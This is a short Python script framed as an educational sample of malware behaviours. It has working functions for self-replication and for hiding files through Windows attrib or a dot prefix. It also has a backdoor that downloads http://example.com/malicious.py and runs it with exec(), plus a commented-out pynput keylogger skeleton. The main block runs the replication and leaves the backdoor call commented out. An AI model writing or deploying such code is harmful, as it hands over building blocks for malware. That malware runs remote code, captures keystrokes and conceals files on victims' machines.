import os
import sys
import subprocess
import urllib.request


# 1. Self-replication (like a simple virus)
def self_replicate():
    try:
        # Read own source code
        with open(sys.argv[0], 'r') as f:
            code = f.read()

        # Write to a new file (replicate)
        new_file = "copy_of_" + os.path.basename(sys.argv[0])
        with open(new_file, 'w') as f:
            f.write(code)
        print(f"Self-replicated to {new_file}")
    except Exception as e:
        print("Replication failed:", e)


# 2. Download and execute remote code (backdoor example)
def download_and_execute():
    url = "http://example.com/malicious.py"  # Fake URL
    try:
        response = urllib.request.urlopen(url)
        code = response.read().decode()
        exec(code)  # Dangerous: executes code from the internet
    except Exception as e:
        print("Download or execution failed:", e)


# 3. Keylogger skeleton (captures keyboard input)
# Note: Needs external libraries like pynput, so this is just illustrative.
def keylogger_demo():
    print("Starting keylogger (demo, no actual logging here)...")
    # Real keyloggers hook OS keyboard events, here just a placeholder
    # import pynput.keyboard
    # def on_press(key):
    #     print(f"Key pressed: {key}")
    # listener = pynput.keyboard.Listener(on_press=on_press)
    # listener.start()


# 4. Hiding files or directories (stealth behavior)
def hide_file(filename):
    try:
        if sys.platform.startswith('win'):
            subprocess.call(['attrib', '+h', filename])  # Windows hidden attribute
        else:
            # On Linux/Mac, prefixing filename with '.' hides it
            hidden_name = '.' + filename
            os.rename(filename, hidden_name)
        print(f"File {filename} hidden.")
    except Exception as e:
        print("Failed to hide file:", e)


# Example usage (comment out dangerous ones)
if __name__ == "__main__":
    self_replicate()  # Replicates the script (educational)
    # download_and_execute() # Downloads and runs remote code (dangerous)
    keylogger_demo()  # Shows keylogger structure
    # hide_file("secret.txt") # Attempts to hide a file
